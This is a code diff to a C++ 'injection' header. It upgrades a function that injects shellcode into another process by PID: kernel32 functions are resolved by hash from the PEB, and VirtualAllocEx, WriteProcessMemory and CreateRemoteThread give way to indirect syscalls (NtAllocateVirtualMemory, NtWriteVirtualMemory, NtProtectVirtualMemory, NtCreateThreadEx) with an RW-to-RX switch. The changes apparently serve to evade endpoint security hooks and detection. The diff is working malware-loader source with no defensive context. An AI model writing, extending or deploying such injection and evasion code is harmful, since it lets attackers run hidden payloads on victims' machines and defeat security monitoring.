@@ -11,6 +11,8 @@
 #include <vector>
 #include <string>
 
+#include "syscalls.h"
+
 namespace injection {
 
 // Helper to get PID by name
@@ -33,31 +35,45 @@ inline DWORD get_process_id_by_name(const std::string& name) {
     return pid;
 }
 
-// Remote Thread Injection
+// Remote Thread Injection via Indirect Syscalls
 inline bool inject_shellcode(DWORD pid, const std::vector<unsigned char>& shellcode) {
-    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+    auto pOpenProcess = (HANDLE(WINAPI*)(DWORD, BOOL, DWORD))peb::Resolve(peb::HASH_KERNEL32, FN_OPENPROCESS);
+    if (!pOpenProcess) return false;
+
+    HANDLE hProcess = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (!hProcess) return false;
 
-    LPVOID pRemoteBuf = VirtualAllocEx(hProcess, nullptr, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!pRemoteBuf) {
+    PVOID pRemoteBuf = nullptr;
+    SIZE_T size = shellcode.size();
+    
+    // NtAllocateVirtualMemory
+    if (syscalls::SysNtAllocateVirtualMemory(hProcess, &pRemoteBuf, 0, &size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != 0) {
         CloseHandle(hProcess);
         return false;
     }
 
-    if (!WriteProcessMemory(hProcess, pRemoteBuf, shellcode.data(), shellcode.size(), nullptr)) {
-        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
+    // NtWriteVirtualMemory
+    if (syscalls::SysNtWriteVirtualMemory(hProcess, pRemoteBuf, (PVOID)shellcode.data(), shellcode.size(), nullptr) != 0) {
+        // We'd ideally free the memory here with NtFreeVirtualMemory
         CloseHandle(hProcess);
         return false;
     }
 
-    HANDLE hThread = CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pRemoteBuf, nullptr, 0, nullptr);
-    if (!hThread) {
-        VirtualFreeEx(hProcess, pRemoteBuf, 0, MEM_RELEASE);
+    // NtProtectVirtualMemory (RW -> RX)
+    DWORD oldProtect;
+    if (syscalls::SysNtProtectVirtualMemory(hProcess, &pRemoteBuf, &size, PAGE_EXECUTE_READ, &oldProtect) != 0) {
         CloseHandle(hProcess);
         return false;
     }
 
-    CloseHandle(hThread);
+    // NtCreateThreadEx
+    HANDLE hThread = NULL;
+    if (syscalls::SysNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, (PVOID)(LPTHREAD_START_ROUTINE)pRemoteBuf, NULL, FALSE, 0, 0, 0, NULL) != 0) {
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    if (hThread) CloseHandle(hThread);
     CloseHandle(hProcess);
     return true;
 }
